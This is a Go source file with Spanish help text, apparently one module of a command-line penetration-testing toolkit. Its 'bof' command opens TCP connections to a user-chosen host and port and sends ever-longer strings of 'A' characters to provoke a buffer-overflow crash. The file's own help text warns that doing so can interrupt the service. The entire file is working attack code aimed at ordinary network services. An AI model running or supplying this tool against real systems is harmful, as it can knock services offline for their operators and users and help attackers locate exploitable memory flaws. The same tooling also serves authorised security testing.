// FICHERO: explotar.go
package main

import (
	"fmt"
	"log"
	"net"
	"strings"
	"time"

	"github.com/spf13/cobra"
)

func NewExploitCmd() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "exploit",
		Short: "Ejecuta módulos de explotación básicos",
		Long:  `Contiene una colección de herramientas de ataque simples para pruebas de concepto.`,
	}
	cmd.AddCommand(newBofCmd())
	return cmd
}

func newBofCmd() *cobra.Command {
	var target string
	var maxSize int
	var step int
	cmd := &cobra.Command{
		Use:   "bof",
		Short: "Realiza un test simple de Buffer Overflow (BOF)",
		Long: `ADVERTENCIA: POTENCIALMENTE DESTRUCTIVO.
Esta herramienta envía cadenas de caracteres cada vez más largas a un servicio
para comprobar si se produce un crash por desbordamiento de búfer.`,
		Run: func(cmd *cobra.Command, args []string) {
			if target == "" {
				log.Fatal("Error: Se requiere un objetivo con el formato host:puerto (-t)")
			}
			runBofTest(target, maxSize, step)
		},
	}
	cmd.Flags().StringVarP(&target, "target", "t", "", "Objetivo a atacar (formato: host:puerto)")
	cmd.Flags().IntVarP(&maxSize, "max-size", "m", 5000, "Tamaño máximo del buffer a enviar")
	cmd.Flags().IntVarP(&step, "step", "s", 100, "Incremento del tamaño del buffer en cada intento")
	return cmd
}

func runBofTest(target string, maxSize, step int) {
	log.Println("--- INICIANDO TEST DE BUFFER OVERFLOW ---")
	log.Printf("Objetivo: %s", target)
	log.Println("¡¡¡ADVERTENCIA!!! Esto puede causar la interrupción del servicio.")
	for size := step; size <= maxSize; size += step {
		fmt.Printf("Enviando buffer de %d bytes... ", size)
		conn, err := net.Dial("tcp", target)
		if err != nil {
			log.Fatalf("\nError: No se pudo conectar al objetivo. ¿El servicio se ha caído? Causa: %v", err)
		}
		payload := strings.Repeat("A", size)
		conn.Write([]byte(payload + "\r\n"))
		conn.SetReadDeadline(time.Now().Add(1 * time.Second))
		response := make([]byte, 1024)
		_, err = conn.Read(response)
		if err != nil {
			fmt.Println("No se recibió respuesta. Posible crash.")
		} else {
			fmt.Println("Servicio respondió. Probablemente no vulnerable a este tamaño.")
		}
		conn.Close()
		time.Sleep(500 * time.Millisecond)
	}
	log.Println("--- TEST DE BUFFER OVERFLOW COMPLETADO ---")
}
